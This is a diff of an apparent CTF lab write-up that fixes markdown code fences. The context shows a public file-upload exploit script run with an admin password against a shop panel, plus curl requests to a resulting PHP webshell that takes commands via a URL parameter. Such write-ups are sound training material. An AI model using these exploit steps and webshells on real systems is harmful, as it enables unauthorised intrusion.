@@ -205,7 +205,8 @@ root@kali# curl -v 'http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id'
 < Content-Length: 0
 < Content-Type: text/html; charset=UTF-8
 < 
-* Connection #0 to host 10.10.10.207 left intact```
+* Connection #0 to host 10.10.10.207 left intact
+```
 
 So the upload succeeded, but the execution isn’t working. I can check that a different way by modifying the script. It’s this line that sets the payload:
 
@@ -225,7 +226,7 @@ I’ll change that to something more benign:
 
 it works:
 
-r```oot@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
+```root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
 Shell => http://10.10.10.207/shop/admin/../vqmod/xml/XPKU4.php?c=id
 darksec was here```
 
@@ -237,11 +238,13 @@ phpinfo() will provide useful information about the box:
         'upload':(None,"Upload")
     }```
 
-```root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
+```bash
+root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
 Shell => http://10.10.10.207/shop/admin/../vqmod/xml/DPYLZ.php?c=id
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml"><head>
-...[snip]...```
+...[snip]...
+```
 
 I’ll use that address to view the page. In that information, it’s clear why the webshell isn’t working:
 
